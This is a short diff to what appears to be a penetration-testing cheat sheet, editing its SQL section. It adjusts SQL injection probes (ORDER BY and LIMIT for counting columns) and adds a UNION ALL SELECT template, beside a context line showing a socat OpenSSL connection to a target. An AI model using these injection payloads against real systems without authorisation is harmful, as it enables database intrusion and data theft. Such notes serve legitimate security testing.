@@ -2639,10 +2639,14 @@ socat - OPENSSL:target_IP:443,verify=0
 ## SQL
 ```
 # determine no. of columns in table : (error - 1) =  no_columns
-' order by increasing_no_here
+ORDER BY increasing_no_here
 
 # return no_here columns
-' LIMIT no_here
+LIMIT no_here
+
+# add second select to query (no_columns must fit!)
+
+UNION ALL SELECT 1,2,...,no_columns_here
 ```
 
 
